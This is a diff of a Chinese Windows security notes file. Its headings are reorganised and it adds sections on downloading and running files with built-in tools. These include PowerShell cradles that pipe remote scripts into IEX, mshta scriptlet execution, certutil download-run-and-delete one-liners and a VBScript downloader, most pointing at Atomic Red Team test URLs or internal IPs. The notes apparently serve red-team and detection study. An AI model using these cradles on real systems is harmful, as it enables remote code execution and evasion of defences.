@@ -5,13 +5,15 @@
 ---
 
 - [Windows 安全](#windows-安全)
-  - [永久关闭 Windows 实时防护](#永久关闭-windows-实时防护)
-  - [Sysmon](#sysmon)
-    - [简介](#简介)
-    - [功能概述](#功能概述)
-    - [使用](#使用)
-  - [查看登录日志](#查看登录日志)
-  - [Process Explorer - 查看某个窗口是哪个进程调起的](#process-explorer---查看某个窗口是哪个进程调起的)
+  - [环境相关](#环境相关)
+    - [永久关闭 Windows 实时防护](#永久关闭-windows-实时防护)
+  - [Windows终端信息采集与分析](#windows终端信息采集与分析)
+    - [Sysmon](#sysmon)
+      - [简介](#简介)
+      - [功能概述](#功能概述)
+      - [使用](#使用)
+    - [查看登录日志](#查看登录日志)
+    - [Process Explorer - 查看某个窗口是哪个进程调起的](#process-explorer---查看某个窗口是哪个进程调起的)
   - [计划任务](#计划任务)
     - [schtasks](#schtasks)
     - [PowerShell Cmdlet](#powershell-cmdlet)
@@ -31,11 +33,16 @@
     - [获取凭证](#获取凭证)
       - [Mimikatz](#mimikatz)
   - [下载与执行文件](#下载与执行文件)
-    - [Net.WebClient](#netwebclient)
-    - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
-    - [Xml.XmlDocument](#xmlxmldocument)
-    - [mshta](#mshta)
-    - [lnk Payload](#lnk-payload)
+    - [系统自带软件或工具](#系统自带软件或工具)
+      - [IPC$](#ipc)
+      - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
+      - [mshta](#mshta)
+      - [Certutil](#certutil)
+    - [Powershell](#powershell)
+      - [Net.WebClient](#netwebclient)
+      - [Xml.XmlDocument](#xmlxmldocument)
+      - [lnk-Powershell-IWR-Start-Process](#lnk-powershell-iwr-start-process)
+    - [VisualBasic](#visualbasic)
   - [编写与执行脚本](#编写与执行脚本)
     - [base64编码命令写入注册表然后读取解码并IEX执行](#base64编码命令写入注册表然后读取解码并iex执行)
     - [利用NTFS的ADS特性将脚本写入文件隐藏数据流](#利用ntfs的ads特性将脚本写入文件隐藏数据流)
@@ -54,7 +61,9 @@
 
 ---
 
-## 永久关闭 Windows 实时防护
+## 环境相关
+
+### 永久关闭 Windows 实时防护
 
 > [Win11 关闭 Windows Defender 实时保护，暂时关闭和永久关闭方法 | Win10 怎么永久关闭 Windows Defender 实时保护\_COCO56(徐可可) 的博客-CSDN 博客](https://blog.csdn.net/COCO56/article/details/128613164)
 
@@ -90,14 +99,16 @@
 
 ---
 
-## Sysmon
+## Windows终端信息采集与分析
+
+### Sysmon
 
 
 > [Sysmon - Sysinternals | Microsoft Learn](https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysmon)
 
 ---
 
-### 简介
+#### 简介
 
 系统监视器(Sysmon) 是一项Windows 系统服务，也是一个设备驱动程序，一旦安装在系统上，就会在系统重新启动后一直驻留，以监视系统活动并将其记录到 Windows 事件日志中。 它提供有关进程创建、网络连接和文件创建时间更改的详细信息。 通过使用 [Windows 事件收集](https://msdn.microsoft.com/library/windows/desktop/bb427443(v=vs.85).aspx)或 [SIEM](https://en.wikipedia.org/wiki/security_information_and_event_management) 代理收集生成的事件，然后对事件进行分析，你可识别恶意或异常活动，并了解入侵者和恶意软件如何在网络上运行。
 
@@ -105,7 +116,7 @@
 
 ----
 
-### 功能概述
+#### 功能概述
 
 *Sysmon* 包括以下功能：
 
@@ -124,7 +135,7 @@
 
 ---
 
-### 使用
+#### 使用
 
 ---
 
@@ -186,7 +197,7 @@ sysmon64 -i
 
 ----
 
-## 查看登录日志
+### 查看登录日志
 
 `Win+X` 或直接搜索打开事件查看器 `->  Windows日志 -> 安全` 然后 `-> 操作 -> 查找` 或者 `右键安全 -> 查找` 
 
@@ -201,7 +212,7 @@ sysmon64 -i
 
 ---
 
-## Process Explorer - 查看某个窗口是哪个进程调起的
+### Process Explorer - 查看某个窗口是哪个进程调起的
 
 > [Process Explorer - Sysinternals | Microsoft Learn --- Process Explorer - Sysinternals | 进程资源管理器微软学习](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)
 >
@@ -821,7 +832,164 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 ## 下载与执行文件
 
-### Net.WebClient
+> [命令行终端下载指令大全 | DeepinWiki](https://wiki.deepin.org/zh/05_HOW-TO/07_系统技巧分享/命令行终端下载指令大全)
+
+---
+
+### 系统自带软件或工具
+
+#### IPC$
+
+IPC$ 是 Windows 操作系统中的一个共享资源，用于支持在网络上进行进程间通信（IPC）。这个共享资源通常位于每个文件共享服务器上，并且可以被网络上的任何用户访问。
+
+利用 `IPC$下载文件`
+
+```powershell
+copy \192.168.3.1\c$\test.exe E:\file
+cmd.exe /k < \webdavserver\folder\batchfile.txt
+```
+
+---
+
+#### Msxml2.ServerXmlHttp
+
+Microsoft XML (MSXML) 是一个开放源代码的 XML 解析器和 HTTP 客户端，由 Microsoft 提供。它是 Windows 操作系统的一部分，并且可以在各种编程语言中使用，包括 C++、Java、VBScript、JavaScript 等。
+
+```powershell
+# 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
+$comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp; 
+# 使用 COM 对象的 Open 方法打开一个 HTTP GET 请求; $False 表示同步请求(非异步)
+$comMsXml.Open('GET', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1', $False); 
+# 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
+$comMsXml.Send(); 
+Write-Host $comMsXml.ResponseText
+# Invoke-Expression 执行响应(中的脚本)
+IEX $comMsXml.ResponseText
+```
+
+---
+
+#### mshta
+
+`mshta.exe` 是 Windows 操作系统中的一个可执行文件，用于运行 HTML 应用程序（HTML Applications，简称 HTA）。
+
+HTA 文件是包含 HTML 和脚本代码（如 VBScript 或 JavaScript）的应用程序，可以在 Windows 环境中运行，类似于本地应用程序。
+
+```cmd
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+```
+
+- `mshta` 是一个执行 HTML 应用程序(HTA) 的工具。  
+  HTA 是由 HTML 和脚本(如 JavaScript 或 VBScript) 组成的应用程序，它们在 Windows 上以类似于标准网页的方式运行
+- `javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()`
+  - `javascript:`: 指示 `mshta` 执行 JavaScript 代码
+  - `a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();`: 获取 `mshta.sct` 中的命令并执行
+  - `close()`: 关闭 `mshta` 窗口
+
+`mshta.sct`
+
+```xml
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Tester"
+    progid="Tester"
+    version="1.00"
+    classid="{AAAA0000-0000-0000-0000-0000AAAAAAAA}"
+	>
+	<script language="JScript">
+		<![CDATA[
+
+			var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
+
+		]]>
+	</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
+	}
+
+]]>
+</script>
+
+</scriptlet>
+
+```
+
+![image-20231205000133728](http://cdn.ayusummer233.top/DailyNotes/202312050001127.png)
+
+---
+
+#### Certutil
+
+> [命令行终端下载指令大全 | DeepinWiki](https://wiki.deepin.org/zh/05_HOW-TO/07_系统技巧分享/命令行终端下载指令大全)
+
+`Certutil` 是 Windows 操作系统中的一个命令行工具，用于管理和操作证书、证书存储区、以及其他与证书相关的任务。
+
+`Certutil` 是 Windows 自带的工具，提供了广泛的功能来支持管理员和用户管理证书服务和公钥基础设施 (PKI) 相关任务。
+
+> [命令行终端下载指令大全 | DeepinWiki](https://wiki.deepin.org/zh/05_HOW-TO/07_系统技巧分享/命令行终端下载指令大全) 中指出如下利用 Certutil 下载文件的命令可以应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
+>
+> PS: 实际测试上在 Win10 上也可以使用
+>
+> ![image-20240531142840794](http://cdn.ayusummer233.top/DailyNotes/202405311428317.png)
+
+```powershell
+# 从 http://192.168.3.1/test.exe 下载文件，并将其保存到当前目录下，文件名为 file.exe。如果文件已经存在，则会被覆盖
+certutil -urlcache -split -f http://192.168.3.1/test.exe file.exe
+
+# 清除 URL 缓存中的所有条目
+certutil -urlcache * delete
+
+# 此条命令，会将原文件下载成为临时 bin 文件，把名字改回来一样可以正常运行
+certutil -verifyctl -split -f -split http://192.168.3.1/test.exe
+## 查看当前目录下的文件找到具体 bin 文件的名称
+Get-ChildItem
+## 将bin文件重命名为exe文件
+Rename-Item -Path [xxx].bin -NewName test.exe
+```
+
+- **`-urlcache`**: 从 URL 下载文件并将其存储在本地
+
+- **`-split`**: 指示 `certutil` 工具分块下载文件
+
+  虽然在大多数情况下，这个选项的作用并不明显，但它可能用于处理较大的文件。
+
+- **`-f`**: 强制覆盖现有文件。如果目标文件 `file.exe` 已经存在，这个选项会强制覆盖它。
+
+> ![image-20240531152407961](http://cdn.ayusummer233.top/DailyNotes/202405311524176.png)
+
+一条龙上线后删除文件和缓存:
+
+```powershell
+certutil -urlcache -split -f http://site.com/a a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://192.168.254.102:80/a delete
+```
+
+
+---
+
+### Powershell
+
+> [What is PowerShell? - PowerShell | Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.4)
+
+PowerShell 是一个跨平台任务自动化解决方案，由命令行 shell、脚本语言和配置管理框架组成。
+
+PowerShell 是一种现代命令 shell，包含其他流行 shell 的最佳功能。与大多数仅接受和返回文本的 shell 不同，PowerShell 基于 .NET 公共语言运行时 (CLR) 构建。所有输入和输出都是 .NET 对象。
+
+---
+
+#### Net.WebClient
+
+`Net.WebClient` 是 .NET 框架中的一个类，用于简化与 HTTP 和 FTP 服务进行数据传输的过程。它位于 `System.Net` 命名空间中，提供了一组方法，用于轻松地下载和上传数据，发送和接收网络资源。
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
@@ -1001,27 +1169,14 @@ Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set
       - `iex` 是 `Invoke-Expression` 的别名, 用于执行字符串中的命令
       - `&` 是 `Invoke-Command` 的别名, 用于执行命令
       - 整个命令的作用是执行 `Default_File_Path.ps1` 中的命令
+
 ---
 
-### Msxml2.ServerXmlHttp
+#### Xml.XmlDocument
+
+`System.Xml.XmlDocument` 是 .NET 框架中的一个类，用于处理 XML 文档。它属于 `System.Xml` 命名空间，提供了对 XML 文档的创建、解析、编辑和保存等功能。`XmlDocument` 类实现了 W3C DOM（Document Object Model）标准，允许开发者以树结构方式操作 XML 数据。
 
 ```powershell
-# 新建一个 COM 对象, 它是 Msxml2.ServerXmlHttp 类的一个实例, 用于发送 HTTP 请求和接受响应
-$comMsXml = New-Object -ComObject MsXml2.ServerXmlHttp; 
-# 使用 COM 对象的 Open 方法打开一个 HTTP GET 请求; $False 表示同步请求(非异步)
-$comMsXml.Open('GET', 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1', $False); 
-# 使用 COM 对象的 Send 方法发送 HTTP 请求并等待响应, 响应会被保存在 COM 对象的 ResponseText 属性中
-$comMsXml.Send(); 
-Write-Host $comMsXml.ResponseText
-# Invoke-Expression 执行响应(中的脚本)
-IEX $comMsXml.ResponseText
-```
-
----
-
-### Xml.XmlDocument
-
-```cml
 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
 ```
 - `-exec bypass`: 绕过 PowerShell 的执行策略。
@@ -1052,63 +1207,7 @@ $Xml.command.a.execute | IEX
 
 ---
 
-### mshta
-
-```cmd
-C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
-```
-
-- `mshta` 是一个执行 HTML 应用程序(HTA) 的工具。  
-  HTA 是由 HTML 和脚本(如 JavaScript 或 VBScript) 组成的应用程序，它们在 Windows 上以类似于标准网页的方式运行
-- `javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()`
-  - `javascript:`: 指示 `mshta` 执行 JavaScript 代码
-  - `a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();`: 获取 `mshta.sct` 中的命令并执行
-  - `close()`: 关闭 `mshta` 窗口
-
-`mshta.sct`
-
-```xml
-<?XML version="1.0"?>
-<scriptlet>
-
-<registration
-    description="Tester"
-    progid="Tester"
-    version="1.00"
-    classid="{AAAA0000-0000-0000-0000-0000AAAAAAAA}"
-	>
-	<script language="JScript">
-		<![CDATA[
-
-			var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
-
-		]]>
-	</script>
-</registration>
-
-<public>
-    <method name="Exec"></method>
-</public>
-<script language="JScript">
-<![CDATA[
-
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
-	}
-
-]]>
-</script>
-
-</scriptlet>
-
-```
-
-![image-20231205000133728](http://cdn.ayusummer233.top/DailyNotes/202312050001127.png)
-
----
-
-### lnk Payload
+#### lnk-Powershell-IWR-Start-Process
 
 > [(1) X 上的 Ankit Anubhav：“As we start the era of #Lnk #Emotet This is a simple POC lnk while which invokes powershell to download clean putty from my github and executes it. If this launches putty and no detect/block happens for your EDR, do investigate deeper if this can change https://t.co/Si4PyIvCVL https://t.co/xZZYSoKoKV” / X (twitter.com)](https://twitter.com/ankit_anubhav/status/1518932941090410496)
 >
@@ -1143,6 +1242,72 @@ Remove-Item $file2 -ErrorAction Ignore
 
 ---
 
+### VisualBasic
+
+在 1998 年 Visual Basic 最终标准在 windows 上确定。下面的代码可以实现下载文件，虽然它的长度比 Powershell 长多了
+
+```vbscript
+Set args = Wscript.Arguments
+Url = "http://domain/file"
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+with bStrm
+    .type = 1 '
+    .open
+    .write xHttp.responseBody
+    .savetofile " C:\%homepath%\file", 2 '
+end with
+```
+
+在 windows 中 Cscript 指令可以允许你执行 VBS 脚本文件或者对 script 脚本做一些设置。
+
+在 windows 7 中这个指令并不是必须要用到。但是在 windows XP 中需要使用这条指令，如下所示:
+
+```powershell
+cscript test.vbs
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+
 
 ## 编写与执行脚本
 
@@ -1158,7 +1323,7 @@ iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Sof
 
 - `/v ART`: 创建一个名为 `ART` 的值
 - `/t REG_SZ`: 设置值的类型为 `REG_SZ`
-- `/d xxx`: `/d` 表示设置值的数据; `xxx` 为数据内容, 这里是一串 base64 编码的数据
+- `/d xxx`: `/d` 表示设置值的数据 ; `xxx` 为数据内容, 这里是一串 base64 编码的数据
 - `/f`: 强制覆盖已有的注册表项
 - `iex`: `Invoke-Expression` 的别名, 执行字符串中的命令
 - `gp`: `Get-ItemProperty` 的别名, 获取注册表项的属性
